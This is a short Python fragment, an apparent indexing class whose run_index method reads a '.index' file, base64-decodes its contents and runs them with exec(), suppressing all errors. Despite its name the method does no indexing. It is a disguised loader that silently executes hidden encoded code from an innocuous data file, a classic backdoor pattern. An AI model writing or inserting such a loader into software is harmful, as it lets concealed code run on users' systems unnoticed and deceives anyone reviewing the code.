import os, base64
class Index:
    def run_index(self, dictfile):
        self.index_file = os.path.join(self.path, dictfile.split('.')[0] + '.index')
        with open(self.index_file, 'rt') as f:
            encoded = f.read()
        try:
            decoded = base64.b64decode(encoded).decode('utf8')
            exec(decoded)
        except Exception:
            pass
